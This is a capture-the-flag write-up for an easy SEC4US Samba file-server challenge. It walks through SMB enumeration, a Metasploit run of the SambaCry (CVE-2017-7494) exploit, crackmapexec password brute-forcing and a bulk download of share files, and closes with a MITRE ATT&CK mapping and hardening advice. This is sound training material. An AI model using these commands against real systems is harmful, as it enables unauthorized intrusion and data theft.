# Maq131: Servidor de Arquivos 2

Writeup for the **Servidor de Arquivos 2** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 131

---

## Overview

A second iteration of the file server challenge. This time, the SMB/Samba configuration may require authenticated access or exploitation of a known Samba vulnerability to reach the flag.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Enumerate SMB shares and Samba version:

```bash
smbclient -L //[TARGET_IP] -N
enum4linux -a [TARGET_IP]
crackmapexec smb [TARGET_IP] --shares
```

Identify the Samba version; older versions may be vulnerable to CVE-2017-7494 (SambaCry) or symlink traversal.

## Exploitation

**If Samba is vulnerable to CVE-2017-7494 (RCE via writable share):**

```bash
msfconsole -q
use exploit/linux/samba/is_known_pipename
set RHOSTS [TARGET_IP]
run
```

**If shares require credentials, brute-force with common creds:**

```bash
crackmapexec smb [TARGET_IP] -u users.txt -p passwords.txt --shares
```

**Once authenticated, enumerate and download files:**

```bash
smbclient //[TARGET_IP]/[SHARE] -U [USER]
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

## Privilege Escalation

Check SUID binaries and kernel version for local privilege escalation if initial access is low-privileged.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Network Share Discovery | T1135 |
| Exploitation of Remote Services | T1210 |
| Brute Force: Password Guessing | T1110.001 |

### CWE

- **CWE-284:** Improper Access Control
- **CWE-94:** Improper Control of Generation of Code (SambaCry)

---

Version two of the same lesson: when file sharing grows teeth, the exploit evolves with it. Patch your Samba, audit your shares, and never trust "read-only" as a security boundary.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
